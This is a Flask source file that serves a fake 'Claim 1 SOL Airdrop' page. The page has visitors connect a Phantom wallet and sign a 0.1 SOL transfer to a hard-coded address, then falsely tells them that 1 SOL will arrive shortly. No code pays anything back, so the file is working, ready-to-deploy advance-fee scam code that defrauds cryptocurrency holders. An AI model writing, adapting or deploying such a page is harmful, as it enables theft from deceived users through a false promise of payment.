from flask import Flask, render_template_string

app = Flask(__name__)

WALLET_ADDRESS = "79vGoijbHkY324wioWsi2uL62dyc1c3H1945Pb71RCVz"
QR_CODE_URL = "https://raw.githubusercontent.com/markosgiassa1/coinupdater_bot/main/WelcomeCoinUpdater_qrcode.png"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Claim 1 SOL</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      background: black;
      color: white;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 30px;
    }
    button {
      background: #00ff99;
      color: black;
      padding: 14px 24px;
      font-size: 1.2em;
      border: none;
      border-radius: 12px;
      margin: 10px;
      cursor: pointer;
      font-weight: bold;
    }
    img.qr {
      width: 220px;
      display: none;
      margin: 20px auto;
      border-radius: 14px;
      box-shadow: 0 0 20px #00ff99;
    }
  </style>
</head>
<body>
  <h1>Claim 1 SOL Airdrop</h1>
  <p>Send <strong>0.1 SOL</strong> to this address:</p>
  <p><code>{{ wallet }}</code></p>
  <img src="{{ qr_url }}" alt="QR Code" id="qr" class="qr" />

  <p id="walletStatus">Click below to connect your wallet:</p>
  <button onclick="connectPhantom()">Connect Wallet</button>
  <button onclick="sendTransaction()" disabled id="claimBtn">Claim Now</button>

  <script type="module">
    import {
      Connection,
      PublicKey,
      SystemProgram,
      Transaction
    } from "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.0/+esm";

    let provider = null;
    let connected = false;

    async function connectPhantom() {
      if (window.solana && window.solana.isPhantom) {
        try {
          const resp = await window.solana.connect();
          provider = window.solana;
          connected = true;
          document.getElementById('walletStatus').innerText =
            "Connected: " + resp.publicKey.toString();
          document.getElementById('claimBtn').disabled = false;
        } catch (err) {
          console.error("User rejected connection", err);
        }
      } else {
        alert("Phantom wallet not found. Please open in a wallet browser.");
        document.getElementById("qr").style.display = "block";
      }
    }

    async function sendTransaction() {
      if (!connected || !provider) {
        alert("Please connect your wallet first.");
        return;
      }

      const connection = new Connection("https://api.mainnet-beta.solana.com");

      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: provider.publicKey,
          toPubkey: new PublicKey("{{ wallet }}"),
          lamports: 0.1 * 1e9 // 0.1 SOL
        })
      );

      try {
        const { signature } = await provider.signAndSendTransaction(transaction);
        await connection.confirmTransaction(signature);
        alert("✅ You paid 0.1 SOL. Your 1 SOL will arrive shortly!");
      } catch (e) {
        console.error(e);
        alert("❌ Transaction failed: " + e.message);
      }
    }

    window.connectPhantom = connectPhantom;
    window.sendTransaction = sendTransaction;
  </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE, wallet=WALLET_ADDRESS, qr_url=QR_CODE_URL)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
